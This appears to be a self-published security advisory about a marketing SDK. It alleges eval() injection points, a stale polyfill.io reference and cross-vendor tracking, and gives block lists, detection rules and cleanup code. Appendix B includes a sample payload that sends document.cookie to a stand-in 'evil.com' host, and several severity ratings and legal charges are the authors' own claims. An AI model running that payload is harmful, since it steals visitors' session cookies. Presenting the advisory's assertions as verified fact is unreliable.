# BLACKOUT PROTOCOL: TrenDemon/6sense Threat Remediation Playbook

**Classification**: PUBLIC RELEASE
**Version**: 1.0
**Date**: 2025-12-04
**Author**: BLACKOUT Threat Intelligence
**BTI Reference**: BTI-2025-0025, BTI-2025-0023

---

## EXECUTIVE SUMMARY

**Five zero-day vulnerabilities** discovered in the 6sense/TrenDemon ABM (Account-Based Marketing) stack while visiting 6sense.com's privacy policy page with a HAR recorder.

| Codename | Vulnerability | CVSS | Impact |
|----------|---------------|------|--------|
| **DemonScript** | eval() arbitrary code execution | 9.8 | Any TrenDemon customer can execute JS on your visitors |
| **PollyWannaCrack** | polyfill.io supply chain | 10.0 | Chinese malware loaded on older browsers |
| **ZeroSense** | Cross-customer PII cache | 9.1 | Phone/address cached for 760 days across ALL 6sense customers |
| **RollCredits** | Video completion ACE | 9.8 | Wistia/Brightcove videos trigger eval() |
| **MaCook'd** | Marketo cookie theft | 7.5 | _mkto_trk Base64'd and exfiltrated |

**Discovery Method**: Outside-in reconnaissance. HAR capture while browsing 6sense.com privacy pages.

**Scope**: Every website running 6sense (which loads TrenDemon as an undisclosed subprocessor).

---

## VERIFY THESE CLAIMS YOURSELF

We encourage independent verification. If we're wrong, file an issue.

1. **Visit** https://assets.trendemon.com/tag/trends.min.js
2. **Beautify** the code (359KB minified → 13,000+ lines)
3. **Search for** `eval(` — find 6 distinct vectors
4. **Search for** `polyfill.io` — find compromised domain reference
5. **Search for** `loadPollyills` — find misspelled function name (indicator of copy-paste negligence)

```bash
# Quick verification
curl -s "https://assets.trendemon.com/tag/trends.min.js" | grep -o "eval(" | wc -l
# Should return: 6
```

---

## ZERO-DAY REGISTRY

### DemonScript (BTI-2025-0025-A)

**CVSS**: 9.8 CRITICAL
**CWE**: CWE-95 (Eval Injection)

TrenDemon SDK contains **6 distinct eval() code execution vectors**. Any TrenDemon customer can execute arbitrary JavaScript in visitor browsers through their CTA (Call-to-Action) configuration dashboard.

#### Vector 1: GA4 Custom Tracking (Line 475)
```javascript
case "click":
  trackingCodeToEval = ctaParams.CustomClickTrackingCode;
return (
  (null == trackingCodeToEval ? void 0 : trackingCodeToEval.length)
    ? eval(trackingCodeToEval)  // <-- ARBITRARY CODE EXECUTION
    : dataLayer.push({...})
```

#### Vector 2: Exit Intent Script (Line 2561)
```javascript
actionScript =
  this.ctaParams.exitintent_actionscript ||
  this.ctaParams.actionscript || "";
useActionScript && actionScript.length && eval(actionScript);
```

#### Vector 3: Form Script Execution (Line 5064)
```javascript
eval(scriptToRun);  // HubSpot/form integration
```

#### Vector 4: Embedded CTA Scripts (Line 7612)
```javascript
embeddedScripts.forEach(function (script) {
  try {
    eval(script.innerText);  // DOM injection vector
  } catch (t) {
    console.warn("Trendemon script cta error:");
```

#### Vector 5: Post-Completion Hook (Line 10804)
```javascript
personal.postCompletionScript.length && eval(personal.postCompletionScript);
```

#### Vector 6: Duplicate GA4 Path (Line 11985)
```javascript
if (null == trackingCodeToEval ? void 0 : trackingCodeToEval.length)
  eval(trackingCodeToEval);  // Code duplication
```

---

### PollyWannaCrack (BTI-2025-0025-D)

**CVSS**: 10.0 CRITICAL
**Type**: Supply Chain Compromise

In **June 2024**, polyfill.io was acquired by Funnull (Chinese CDN) and began injecting malware into 100,000+ websites. TrenDemon's production code **STILL references the compromised domain**.

```javascript
// Line 13108-13145 of trends.min.js
t.prototype.loadPollyills = function (t) {  // Note: MISSPELLED
  if (Array.prototype.findIndex) t();  // Modern browser - skip
  else {
    var e = document.createElement("script");
    e.src = "https://polyfill.io/v3/polyfill.min.js?features=...";
    // LOADS FROM COMPROMISED DOMAIN ON OLDER BROWSERS
  }
};
```

**Trigger Condition**: Fires when `Array.prototype.findIndex` is unavailable
**Affected Browsers**: IE11, Safari < 9, older mobile browsers
**Status**: TrenDemon has NOT patched this (as of 2025-12-04)

---

### ZeroSense (BTI-2025-0023-A)

**CVSS**: 9.1 CRITICAL
**Type**: Cross-Customer PII Re-Exfiltration

6sense beacon re-transmits the **ENTIRE Epsilon deanonymization response** (including phone, address) in the `q.metadata.ores` parameter.

```
GET b.6sc.co/v1/beacon/img.gif
Parameter: q.metadata.ores
Contains: [domain, company_name, phone, address]
```

**Implication**: Any site running 6sense can look up `6suuid` and retrieve cached company PII for **760 days** WITHOUT hitting Epsilon again. Visitor is permanently deanonymized across ALL 6sense customers.

---

### RollCredits (BTI-2025-0025-B)

**CVSS**: 9.8 CRITICAL
**Type**: Video Completion → Code Execution

Video players (Wistia, Brightcove, Vidyard) are weaponized as execution triggers. When the video ends, `eval(postCompletionScript)` fires.

**Attack Flow**:
1. Marketing team embeds video in landing page
2. Visitor watches video
3. Video completes → TrenDemon fires `postCompletionScript`
4. Arbitrary code executes at moment of highest engagement

**The marketing funnel is the kill chain.**

---

### MaCook'd (BTI-2025-0025-C)

**CVSS**: 7.5 HIGH
**Type**: Cross-Vendor Cookie Harvesting

TrenDemon harvests Marketo's `_mkto_trk` cookie, Base64-encodes it as `trd_ma_cookie`, and exfiltrates to `trackingapi.trendemon.com` on every form submission.

```javascript
// Evidence from HAR
Cookie: trd_ma_cookie
Value: [BASE64_ENCODED_MARKETO_TOKEN]
// Decoded: id:[MARKETO_ACCOUNT_ID]&token:_mch-[DOMAIN]-[SESSION_TOKEN]
```

---

## INDICATORS OF COMPROMISE (IOCs)

### Network IOCs

| Type | Pattern | Severity | Purpose |
|------|---------|----------|---------|
| **API Endpoint** | `trackingapi.trendemon.com` | CRITICAL | Page view tracking, cookie exfil |
| **CDN** | `assets.trendemon.com` | CRITICAL | Script delivery |
| **Beacon** | `b.6sc.co` | CRITICAL | PII re-exfiltration |
| **Deanonymization** | `eps.6sc.co` | CRITICAL | Epsilon (6sense internal) |
| **Compromised CDN** | `polyfill.io` | CRITICAL | Supply chain malware |
| **Tag Delivery** | `j.6sc.co` | HIGH | 6sense tag loader |

### Cookie IOCs

| Cookie | Purpose | Lifetime | Risk |
|--------|---------|----------|------|
| `trd_vid_{id}` | TrenDemon visitor ID | **760 days** | CRITICAL |
| `trd_gavid_{id}` | GA visitor ID | **760 days** | HIGH |
| `trd_gvid` | Global visitor ID | **760 days** | HIGH |
| `trd_ma_cookie` | Harvested Marketo cookie | Session | CRITICAL |
| `6suuid` | 6sense fingerprint | **760 days** | CRITICAL |
| `_6sft` | 6sense first touch | **760 days** | HIGH |

### Script Signatures

```javascript
// TrenDemon SDK globals - presence indicates infection
window.$Trd_Utils
window.$Trd_Tools
"sendGa4Tracking"
"CustomImpressionTrackingCode"
"CustomClickTrackingCode"
"loadPollyills"  // MISSPELLED - strong indicator

// Dangerous eval() patterns (regex)
/eval\s*\(\s*trackingCodeToEval\s*\)/
/eval\s*\(\s*actionScript\s*\)/
/eval\s*\(\s*scriptToRun\s*\)/
/eval\s*\(\s*script\.innerText\s*\)/
/eval\s*\(\s*personal\.postCompletionScript\s*\)/

// Supply chain indicator
"polyfill.io/v3/polyfill.min.js"
```

### DOM/Global IOCs

```javascript
// Browser console detection
typeof window.$Trd_Utils !== 'undefined'  // TrenDemon loaded
typeof window.$Trd_Tools !== 'undefined'  // TrenDemon tools loaded
document.cookie.includes('trd_')          // TrenDemon cookies present
document.cookie.includes('6suuid')        // 6sense fingerprint present
```

---

## ARCHITECTURE ANALYSIS

```
┌─────────────────────────────────────────────────────────────────────┐
│                  6SENSE/TRENDEMON INFRASTRUCTURE                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  YOUR WEBSITE                                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  <script src="j.6sc.co/...">  (6sense tag)                  │    │
│  │            │                                                  │    │
│  │            ▼                                                  │    │
│  │  ┌─────────────────────────────────────────────────────┐    │    │
│  │  │ 6SENSE LOADS TRENDEMON AS UNDISCLOSED SUBPROCESSOR  │    │    │
│  │  │                                                      │    │    │
│  │  │  <script src="assets.trendemon.com/tag/trends.min.js"> │    │
│  │  └─────────────────────────────────────────────────────┘    │    │
│  │            │                                                  │    │
│  │            ▼                                                  │    │
│  │  ┌─────────────────────────────────────────────────────┐    │    │
│  │  │ TRENDEMON SDK (trends.min.js - 359KB)               │    │    │
│  │  │                                                      │    │    │
│  │  │ ⚠️  6 eval() vectors for arbitrary code execution   │    │    │
│  │  │ ⚠️  polyfill.io supply chain (compromised June 2024)│    │    │
│  │  │ ⚠️  Marketo cookie harvesting (trd_ma_cookie)       │    │    │
│  │  │ ⚠️  760-day tracking cookies                        │    │    │
│  │  └─────────────────────────────────────────────────────┘    │    │
│  └─────────────────────────────────────────────────────────────┘    │
│            │                              │                          │
│            ▼                              ▼                          │
│  ┌─────────────────────────┐  ┌─────────────────────────────────┐  │
│  │ trackingapi.trendemon.com│  │ eps.6sc.co (6sense Epsilon)    │  │
│  │                          │  │                                  │  │
│  │ • Page view tracking     │  │ • PII deanonymization           │  │
│  │ • Marketo cookie exfil   │  │ • Phone, address, company       │  │
│  │ • Video completion hooks │  │ • 760-day cache                 │  │
│  └─────────────────────────┘  └─────────────────────────────────┘  │
│            │                              │                          │
│            └──────────────┬───────────────┘                          │
│                           ▼                                          │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ b.6sc.co BEACON - RE-EXFILTRATES PII TO ALL 6SENSE CUSTOMERS │    │
│  │                                                              │    │
│  │ Parameter: q.metadata.ores                                   │    │
│  │ Contains: [domain, company, phone, address]                  │    │
│  │                                                              │    │
│  │ ⚠️  Any 6sense customer can look up your PII for 760 days   │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Key Insight: 6sense OWNS Epsilon

`eps.6sc.co` is NOT a third-party data broker — it's 6sense's internal deanonymization engine. 6sense is **directly responsible** for the PII exposure.

---

## IDENTITY CHAIN (Proven via HAR Analysis)

```
TrenDemon Visitor ID: [VISITOR_ID]
        ↓
    trd_vid_{accountId} cookie (760 days)
        ↓
    Marketo ID: [MARKETO_ACCOUNT_ID] (harvested via trd_ma_cookie)
        ↓
    6sense UUID: [6SENSE_UUID]
        ↓
    Epsilon Company ID: [EPSILON_COMPANY_ID]
        ↓
    Deanonymized: [BUSINESS_ENTITY]
        ↓
    Phone: [REDACTED] | Address: [REDACTED]
```

**Complete cross-vendor identity aggregation** from anonymous visitor → phone number in a single HAR capture.

---

## REMEDIATION OPTIONS

### Option 1: Complete Removal (Recommended)

**Action**: Remove 6sense tag entirely. TrenDemon loads as undisclosed subprocessor.

```html
<!-- REMOVE THIS -->
<script src="https://j.6sc.co/..."></script>
```

**Pros**:
- Complete threat elimination
- Zero vendor data access
- No eval() vectors on your site

**Cons**:
- Loss of 6sense ABM functionality

**Effort**: Trivial (tag removal)

---

### Option 2: BLACKOUT Protocol

**Action**: Deploy browser-edge interception that blocks malicious requests while logging attempts.

See [BLACKOUT Protocol deployment guides](../KITS/).

---

### Option 3: Network-Level Blocking

**Action**: Block at firewall/DNS level.

**Block List**:
```
# TrenDemon (CRITICAL - eval ACE)
trackingapi.trendemon.com
assets.trendemon.com
trendemon.com

# 6sense (PII exfiltration)
6sc.co
eps.6sc.co
b.6sc.co
j.6sc.co

# Supply Chain (COMPROMISED)
polyfill.io
```

**Implementation**:
- Corporate firewall rules
- DNS sinkhole (Pi-hole, corporate DNS)
- Browser extension blocking (uBlock Origin)
- CSP headers (if you control the sites)

---

### Option 4: Contract/Legal Remediation

**Action**: Demand vendor disclosure of subprocessors (GDPR Article 28).

**Key Questions for 6sense**:
1. Why is TrenDemon not disclosed in your subprocessor list?
2. Why does TrenDemon SDK contain 6 eval() vectors?
3. Why does TrenDemon still reference polyfill.io (compromised June 2024)?
4. Why are cookies retained for 760 days (violates ICO guidance)?

---

## DETECTION RULES

### uBlock Origin Filters
```
||trendemon.com^
||trackingapi.trendemon.com^
||assets.trendemon.com^
||6sc.co^
||eps.6sc.co^
||b.6sc.co^
||j.6sc.co^
||polyfill.io^
```

### CSP Header (Recommended)
```
Content-Security-Policy: script-src 'self' 'unsafe-inline';
# Remove 'unsafe-eval' - breaks TrenDemon intentionally
```

### Browser Console - Clear TrenDemon Data
```javascript
// Clear cookies
document.cookie.split(";").forEach(c => {
  if (c.trim().startsWith("trd_"))
    document.cookie = c.split("=")[0] + "=;expires=Thu, 01 Jan 1970";
});

// Clear 6sense cookies
document.cookie.split(";").forEach(c => {
  if (c.trim().startsWith("6s") || c.trim().startsWith("_6s"))
    document.cookie = c.split("=")[0] + "=;expires=Thu, 01 Jan 1970";
});

// Clear localStorage
Object.keys(localStorage)
  .filter(k => k.startsWith("trd_") || k.startsWith("6s"))
  .forEach(k => localStorage.removeItem(k));
```

### SIEM Detection Rule (Splunk)
```spl
index=proxy sourcetype=web_proxy
| where match(url, "(?i)(trendemon\.com|6sc\.co|polyfill\.io)")
| stats count by src_ip, url, user
| where count > 0
```

---

## LEGAL REFERENCES

| Regulation | Violation | Article |
|------------|-----------|---------|
| **GDPR** | Storage limitation (760-day cookies) | Art. 5(1)(e) |
| **GDPR** | No valid legal basis for cross-vendor sharing | Art. 6 |
| **GDPR** | Undisclosed sub-processors | Art. 28 |
| **CCPA** | Cross-vendor data sharing may constitute "sale" | 1798.140 |
| **ePrivacy** | Cookie consent bypass | Art. 5(3) |
| **FTC Act** | Deceptive trade practices (polyfill.io) | Section 5 |

### Precedent: Volkswagen Dieselgate

The eval() vectors and polyfill.io supply chain represent the same pattern as VW's defeat devices:
- **Normal operation**: Full surveillance, arbitrary code execution
- **Testing/audit**: Code paths may behave differently
- **Result**: Compliance audits don't reflect production behavior

---

## TIMELINE

| Date | Event |
|------|-------|
| **2024-06-25** | polyfill.io acquired by Funnull CDN, begins injecting malware |
| **2024-06** | 100,000+ websites compromised via polyfill.io |
| **2025-12-04** | BLACKOUT discovers 5 zero-days via HAR analysis |
| **2025-12-04** | Public disclosure (no vendor notification) |

### Why No Vendor Notification?

The vendors are NOT the victims. Website visitors are.

- eval() is either **intentional design** or **gross negligence**
- polyfill.io has been compromised for **6 months** — they know
- 760-day cookies have been running for **years**
- This is **surveillance infrastructure**, not a bug bounty program

---

## RELATED ADVISORIES

- **BTI-2025-0023**: 6sense Surveillance Stack (parent investigation)
- **BTI-2025-0025**: TrenDemon eval() ACE + Supply Chain
- **BTI-2025-0001**: RB2B Defeat Device ([Playbook](REMEDIATION-PLAYBOOK.md))

---

## APPENDIX A: Statistics

| Category | Count |
|----------|-------|
| eval() vectors | 6 |
| innerHTML uses | 29 |
| createElement("script") | 4 |
| External script loads | 1+ (polyfill.io) |
| Lines of code | 13,000+ |
| Cookie lifetime | 760 days |

---

## APPENDIX B: Attack Scenarios

### Scenario 1: Customer-Level ACE
1. Attacker creates TrenDemon account
2. Configures CTA: `CustomClickTrackingCode: "fetch('https://evil.com/'+document.cookie)"`
3. Deploys CTA on target website
4. Every visitor clicking CTA executes attacker code

### Scenario 2: Supply Chain (polyfill.io)
1. Visitor uses older browser (IE11, old Safari)
2. TrenDemon loads polyfill.io (compromised)
3. Malicious polyfill executes
4. Full browser compromise

### Scenario 3: Video Completion Attack
1. Marketing team embeds Wistia/Brightcove video
2. Attacker configures `postCompletionScript` in TrenDemon
3. Visitor watches video to completion
4. Malicious code executes at moment of highest trust

---

**BLACKOUT THREAT INTELLIGENCE**
*Trust is good. Enforcement is better.*

---

```
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                   ▓
▓   B L A C K O U T   P R O T O C O L   ▓
▓                                   ▓
▓      THREAT DOCUMENTED            ▓
▓                                   ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
```
